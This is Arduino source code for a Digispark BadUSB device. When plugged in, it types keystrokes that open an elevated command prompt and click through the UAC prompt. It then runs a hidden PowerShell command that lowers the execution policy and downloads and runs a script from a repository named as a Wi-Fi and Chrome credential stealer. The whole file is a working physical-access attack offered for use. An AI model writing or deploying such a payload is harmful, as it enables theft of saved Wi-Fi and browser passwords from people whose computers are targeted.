#include <DigiKeyboard.h>

#include "DigiKeyboard.h"

void typeKeyFast(int key){
    DigiKeyboard.sendKeyPress(key);
    delay(10);
}

void startCMD(){
    delay(450);
    DigiKeyboard.sendKeyPress(MOD_CONTROL_LEFT);
    delay(100);
    DigiKeyboard.sendKeyPress(41);
    delay(100);
    DigiKeyboard.println("cmd");
    DigiKeyboard.sendKeyPress(MOD_CONTROL_LEFT);
    delay(140);
    DigiKeyboard.sendKeyPress(MOD_SHIFT_LEFT);
    delay(140);
    typeKeyFast(40);
    delay(1500);
}

void bypassUAC(){
    typeKeyFast(43);
    typeKeyFast(43);
    for (int i = 0; i < 70; i++){
        typeKeyFast(42);
    }
    typeKeyFast(40);
    delay(500);
}

void printCommand(){
    DigiKeyboard.println("PowerShell.exe -windowstyle hidden Set-ExecutionPolicy Bypass -Force (new-object System.Net.WebClient).DownloadFile('https://github.com/justwibi/Wifi-and-Chrome-DigiSparkStealer-.git', 'b.ps1'); Set-ExecutionPolicy Unrestricted; .\\b.ps1");
    typeKeyFast(40);
}

void run(){
    startCMD();
    bypassUAC();
    printCommand();
}

void setup() {
    run();
}

void loop() {
    int led2 = 13;
    digitalWrite(led2, LOW);
    delay(120);
    digitalWrite(led2, HIGH);
    delay(120);
}
